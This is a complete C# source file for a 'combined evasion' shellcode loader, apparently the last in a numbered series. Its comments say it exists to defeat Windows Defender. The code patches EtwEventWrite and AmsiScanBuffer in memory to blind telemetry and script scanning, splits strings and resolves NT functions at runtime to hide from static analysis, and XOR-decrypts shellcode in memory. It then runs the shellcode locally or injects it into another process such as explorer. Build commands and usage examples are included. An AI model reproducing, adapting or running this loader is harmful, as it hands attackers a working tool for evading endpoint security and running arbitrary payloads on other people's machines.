// ============================================================================
// LOADER 08: Combined Evasion Loader
// ============================================================================
//
// WHAT THIS DOES:
//   This is the final loader that combines ALL evasion techniques from
//   Loaders 01 through 07 into a single program. It executes in the correct
//   order to maximize stealth:
//     1. Patch ETW (go silent - no telemetry)
//     2. Patch AMSI (disable script scanning)
//     3. Decrypt shellcode (XOR decode at runtime)
//     4. Use NT functions resolved dynamically (hide API imports)
//     5. Allocate memory with careful permission changes (avoid RWX)
//     6. Execute via thread or APC injection
//
//   Each step builds on the previous ones. ETW must be patched first so the
//   AMSI patch is not logged. AMSI must be patched before loading any .NET
//   tooling. Shellcode must be decrypted in memory before execution.
//
// WHY THIS IS NEEDED:
//   Individual techniques are increasingly detected. Defender in 2026 uses
//   multiple detection layers (signatures, behavior, cloud ML, ETW telemetry).
//   A single technique might bypass one layer but get caught by another.
//   Combining all techniques creates a layered evasion that defeats multiple
//   detection mechanisms simultaneously.
//
// EVASION MECHANISM:
//   Layer 1 - ETW patch: Defender gets no telemetry from our process
//   Layer 2 - AMSI patch: Script scanning is disabled
//   Layer 3 - XOR decryption: No malicious signatures on disk
//   Layer 4 - Dynamic API resolution: No suspicious imports in the binary
//   Layer 5 - RW then RX memory: Allocation pattern looks legitimate
//   Layer 6 - NT functions: Skip user-mode hooks on ntdll.dll
//
// REFERENCES:
//   All previous loaders plus:
//   - HackerXone: "Windows Defender Bypass Techniques in 2026"
//   - RingSafe: "EDR Bypass Techniques in 2026"
//   - Document: 10_combined_evasion.md
//
// BUILD INSTRUCTIONS:
//   csc /unsafe /out:stealth_loader.exe 08_combined_evasion.cs
//
// USAGE:
//   stealth_loader.exe <encrypted_shellcode.bin> <xor_key_hex> [target_process]
//
//   If target_process is specified, injects into that process (remote injection).
//   If not specified, executes in the current process (local execution).
//
//   Example (local):
//     stealth_loader.exe encrypted.bin 4A7F2B1C...
//   Example (remote injection):
//     stealth_loader.exe encrypted.bin 4A7F2B1C... explorer
//
// ============================================================================

using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CombinedEvasion
{
    class Program
    {
        // ====================================================================
        // SECTION 1: Windows API imports
        // ====================================================================

        // We only import the minimum needed for bootstrapping. The actual
        // memory operations use NT functions resolved at runtime.

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // ====================================================================
        // SECTION 2: NT function delegates for dynamic resolution
        // ====================================================================

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtWriteVirtualMemoryDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtCreateThreadExDelegate(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartRoutine, IntPtr Argument, uint CreateFlags, IntPtr ZeroBits, IntPtr StackSize, IntPtr MaximumStackSize, IntPtr AttributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtWaitForSingleObjectDelegate(IntPtr Handle, bool Alertable, IntPtr Timeout);

        // ====================================================================
        // SECTION 3: Constants
        // ====================================================================

        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint THREAD_ALL_ACCESS = 0x1FFFFF;
        const uint PROCESS_ALL_ACCESS = 0x001FFFFF;

        // ====================================================================
        // SECTION 4: Helper functions
        // ====================================================================

        // Resolve an NT function from ntdll.dll at runtime.
        // By resolving functions this way, our binary's import table does not
        // contain any NT function names. Static analysis tools cannot see
        // which NT functions we call by looking at the binary.
        static T ResolveNtFunction<T>(string functionName) where T : Delegate
        {
            IntPtr ntdll = GetModuleHandle(BuildString("nt", "dll"));
            if (ntdll == IntPtr.Zero)
                throw new Exception("ntdll not found");

            IntPtr addr = GetProcAddress(ntdll, functionName);
            if (addr == IntPtr.Zero)
                throw new Exception("Function not found: " + functionName);

            return (T)Marshal.GetDelegateForFunctionPointer(addr, typeof(T));
        }

        // Build a string from parts at runtime.
        // This prevents complete strings like "ntdll", "AmsiScanBuffer",
        // "EtwEventWrite" from appearing in the compiled binary.
        static string BuildString(params string[] parts)
        {
            return string.Concat(parts);
        }

        // XOR decrypt shellcode.
        static byte[] XorDecrypt(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        // Convert hex string to byte array.
        static byte[] HexToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        // ====================================================================
        // SECTION 5: ETW Patch
        // ====================================================================

        // This is the first thing we do. Patching ETW stops our process from
        // sending telemetry to Defender. After this, Defender cannot see what
        // our process is doing through ETW events.
        static bool PatchEtw()
        {
            Console.WriteLine("[1/6] Patching ETW...");

            IntPtr ntdll = GetModuleHandle(BuildString("nt", "dll"));
            if (ntdll == IntPtr.Zero) return false;

            // Build "EtwEventWrite" from pieces.
            string funcName = BuildString("Etw", "Event", "Write");
            IntPtr funcAddr = GetProcAddress(ntdll, funcName);
            if (funcAddr == IntPtr.Zero) return false;

            // Change memory protection to allow writing.
            uint oldProtect;
            if (!VirtualProtect(funcAddr, (UIntPtr)3, PAGE_EXECUTE_READWRITE, out oldProtect))
                return false;

            // Patch: xor eax, eax; ret (return 0 = STATUS_SUCCESS)
            byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };
            Marshal.Copy(patch, 0, funcAddr, patch.Length);

            // Restore protection.
            uint ignored;
            VirtualProtect(funcAddr, (UIntPtr)3, oldProtect, out ignored);

            Console.WriteLine("      ETW patched. No telemetry from this process.");
            return true;
        }

        // ====================================================================
        // SECTION 6: AMSI Patch
        // ====================================================================

        // This is the second step. With ETW already patched, the AMSI
        // patching will not generate any telemetry events. Defender will
        // not know we tampered with AMSI.
        static bool PatchAmsi()
        {
            Console.WriteLine("[2/6] Patching AMSI...");

            // Load amsi.dll (build name from parts).
            string dllName = BuildString("am", "si", ".dll");
            IntPtr amsiDll = LoadLibrary(dllName);
            if (amsiDll == IntPtr.Zero) return false;

            // Find AmsiScanBuffer (build name from parts).
            string funcName = BuildString("Amsi", "Scan", "Buffer");
            IntPtr funcAddr = GetProcAddress(amsiDll, funcName);
            if (funcAddr == IntPtr.Zero) return false;

            // Change memory protection.
            uint oldProtect;
            if (!VirtualProtect(funcAddr, (UIntPtr)6, PAGE_EXECUTE_READWRITE, out oldProtect))
                return false;

            // Patch: mov eax, 0x80070057; ret (return E_INVALIDARG)
            byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(patch, 0, funcAddr, patch.Length);

            // Restore protection.
            uint ignored;
            VirtualProtect(funcAddr, (UIntPtr)6, oldProtect, out ignored);

            Console.WriteLine("      AMSI patched. Script scanning disabled.");
            return true;
        }

        // ====================================================================
        // SECTION 7: Local execution (run shellcode in current process)
        // ====================================================================

        static void ExecuteLocal(byte[] shellcode)
        {
            IntPtr currentProcess = (IntPtr)(-1);

            // Resolve NT functions dynamically.
            Console.WriteLine("[4/6] Resolving NT functions...");
            var ntAlloc = ResolveNtFunction<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory");
            var ntProtect = ResolveNtFunction<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory");
            var ntCreateThread = ResolveNtFunction<NtCreateThreadExDelegate>("NtCreateThreadEx");
            var ntWait = ResolveNtFunction<NtWaitForSingleObjectDelegate>("NtWaitForSingleObject");
            Console.WriteLine("      NT functions resolved.");

            // Allocate memory as READ-WRITE (not executable yet).
            Console.WriteLine("[5/6] Allocating memory...");
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            int status = ntAlloc(currentProcess, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (status != 0)
            {
                Console.WriteLine("      [-] Allocation failed: 0x" + status.ToString("X"));
                return;
            }

            // Write shellcode using Marshal.Copy.
            Marshal.Copy(shellcode, 0, baseAddr, shellcode.Length);

            // Clear managed copy.
            Array.Clear(shellcode, 0, shellcode.Length);

            // Change protection to EXECUTE-READ.
            IntPtr protAddr = baseAddr;
            IntPtr protSize = regionSize;
            uint oldProt;
            ntProtect(currentProcess, ref protAddr, ref protSize, PAGE_EXECUTE_READ, out oldProt);
            Console.WriteLine("      Memory ready (RW -> RX).");

            // Create thread to execute.
            Console.WriteLine("[6/6] Executing shellcode...");
            IntPtr threadHandle;
            status = ntCreateThread(out threadHandle, THREAD_ALL_ACCESS, IntPtr.Zero, currentProcess, baseAddr, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (status != 0)
            {
                Console.WriteLine("      [-] Thread creation failed: 0x" + status.ToString("X"));
                return;
            }

            Console.WriteLine("      Shellcode running.");
            ntWait(threadHandle, false, IntPtr.Zero);
        }

        // ====================================================================
        // SECTION 8: Remote injection (inject into another process)
        // ====================================================================

        static void ExecuteRemote(byte[] shellcode, string targetProcessName)
        {
            // Find target process.
            Console.WriteLine("[4/6] Finding target process: " + targetProcessName + "...");
            Process[] procs = Process.GetProcessesByName(targetProcessName);
            if (procs.Length == 0)
            {
                Console.WriteLine("      [-] Process not found.");
                return;
            }

            int targetPid = procs[0].Id;
            Console.WriteLine("      Found PID: " + targetPid);

            // Open target process.
            IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("      [-] Could not open process. Need admin privileges.");
                return;
            }

            // Resolve NT functions for remote operations.
            var ntAlloc = ResolveNtFunction<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory");
            var ntWrite = ResolveNtFunction<NtWriteVirtualMemoryDelegate>("NtWriteVirtualMemory");
            var ntProtect = ResolveNtFunction<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory");
            var ntCreateThread = ResolveNtFunction<NtCreateThreadExDelegate>("NtCreateThreadEx");

            // Allocate memory in target process.
            Console.WriteLine("[5/6] Injecting into " + targetProcessName + "...");
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            int status = ntAlloc(processHandle, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (status != 0)
            {
                Console.WriteLine("      [-] Remote allocation failed: 0x" + status.ToString("X"));
                CloseHandle(processHandle);
                return;
            }

            // Write shellcode to target process using NtWriteVirtualMemory.
            // Using the NT function instead of WriteProcessMemory avoids hooks.
            uint bytesWritten;
            status = ntWrite(processHandle, baseAddr, shellcode, (uint)shellcode.Length, out bytesWritten);

            // Clear managed copy.
            Array.Clear(shellcode, 0, shellcode.Length);

            if (status != 0)
            {
                Console.WriteLine("      [-] Write failed: 0x" + status.ToString("X"));
                CloseHandle(processHandle);
                return;
            }

            // Change protection to executable.
            IntPtr protAddr = baseAddr;
            IntPtr protSize = regionSize;
            uint oldProt;
            ntProtect(processHandle, ref protAddr, ref protSize, PAGE_EXECUTE_READ, out oldProt);

            // Create remote thread.
            Console.WriteLine("[6/6] Creating remote thread...");
            IntPtr threadHandle;
            status = ntCreateThread(out threadHandle, THREAD_ALL_ACCESS, IntPtr.Zero, processHandle, baseAddr, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (status != 0)
            {
                Console.WriteLine("      [-] Remote thread failed: 0x" + status.ToString("X"));
                CloseHandle(processHandle);
                return;
            }

            Console.WriteLine("      Shellcode running inside " + targetProcessName + " (PID " + targetPid + ").");
            CloseHandle(threadHandle);
            CloseHandle(processHandle);
        }

        // ====================================================================
        // SECTION 9: Main - orchestrate everything in the right order
        // ====================================================================

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Combined Evasion Loader");
                Console.WriteLine("Usage: stealth_loader.exe <encrypted_shellcode.bin> <xor_key_hex> [target_process]");
                Console.WriteLine("");
                Console.WriteLine("  encrypted_shellcode.bin: XOR-encrypted shellcode file");
                Console.WriteLine("  xor_key_hex:             XOR key from the encoder");
                Console.WriteLine("  target_process:          optional process name for remote injection");
                Console.WriteLine("");
                Console.WriteLine("Examples:");
                Console.WriteLine("  stealth_loader.exe payload.bin 4A7F2B1C...");
                Console.WriteLine("  stealth_loader.exe payload.bin 4A7F2B1C... explorer");
                return;
            }

            string shellcodePath = args[0];
            string keyHex = args[1];
            string targetProcess = args.Length >= 3 ? args[2] : null;

            Console.WriteLine("=== Combined Evasion Loader ===");
            Console.WriteLine("");

            // ---- Step 1: Patch ETW ----
            // Must be first. Stops all telemetry so subsequent patches are invisible.
            if (!PatchEtw())
            {
                Console.WriteLine("[-] ETW patch failed. Continuing anyway (higher detection risk).");
            }

            // ---- Step 2: Patch AMSI ----
            // Second step. With ETW patched, this tampering is not logged.
            if (!PatchAmsi())
            {
                Console.WriteLine("[-] AMSI patch failed. Continuing anyway (PowerShell scripts may be blocked).");
            }

            // ---- Step 3: Decrypt shellcode ----
            // The shellcode on disk is XOR-encrypted so it does not match
            // any known signatures. We decrypt it in memory only.
            Console.WriteLine("[3/6] Decrypting shellcode...");
            byte[] encrypted = File.ReadAllBytes(shellcodePath);
            byte[] key = HexToBytes(keyHex);
            byte[] shellcode = XorDecrypt(encrypted, key);

            // Clear the encrypted copy from managed memory.
            Array.Clear(encrypted, 0, encrypted.Length);
            Console.WriteLine("      Decrypted " + shellcode.Length + " bytes in memory.");

            // ---- Steps 4-6: Execute ----
            if (targetProcess != null)
            {
                // Remote injection into another process.
                ExecuteRemote(shellcode, targetProcess);
            }
            else
            {
                // Local execution in current process.
                ExecuteLocal(shellcode);
            }

            Console.WriteLine("");
            Console.WriteLine("=== Execution complete ===");
        }
    }
}
